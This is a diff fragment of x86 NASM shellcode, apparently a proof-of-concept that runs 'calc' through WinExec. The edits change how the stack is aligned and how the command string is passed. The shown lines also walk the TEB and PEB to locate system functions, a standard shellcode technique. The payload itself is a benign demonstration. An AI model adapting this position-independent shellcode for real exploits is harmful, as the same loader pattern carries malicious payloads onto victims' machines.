@@ -12,6 +12,7 @@ SECTION .text
 
 ; WinExec *requires* 4 byte stack alignment
 %ifndef PLATFORM_INDEPENDENT
+%undef USE_COMMON                         ; not allowed as user-supplied
 global _shellcode                         ; _ is needed because LINKER will add it automatically.
 _shellcode:
 %ifdef FUNC
@@ -21,7 +22,7 @@ _shellcode:
 %ifdef FUNC
      MOV    EAX, ESP
 %endif
-     AND    SP, 0xFFFC
+     AND    ESP, -4
 %ifdef FUNC
      PUSH   EAX
 %endif
@@ -33,11 +34,14 @@ _shellcode:
 %endif
     INC     EDX
 %endif
+%ifndef USE_COMMON
     PUSH    EDX                           ; Stack = 0
     PUSH    B2DW('c', 'a', 'l', 'c')      ; Stack = "calc", 0
-    MOV     ESI, ESP                      ; ESI = &("calc")
+    PUSH    ESP
+    POP     ECX                           ; ECX = &("calc")
+%endif
     PUSH    EDX                           ; Stack = 0, "calc", 0
-    PUSH    ESI                           ; Stack = &("calc"), 0, "calc", 0
+    PUSH    ECX                           ; Stack = &("calc"), 0, "calc", 0
 ; Stack contains arguments for WinExec
     MOV     ESI, [FS:EDX + 0x30]          ; ESI = [TEB + 0x30] = PEB
     MOV     ESI, [ESI + 0x0C]             ; ESI = [PEB + 0x0C] = PEB_LDR_DATA
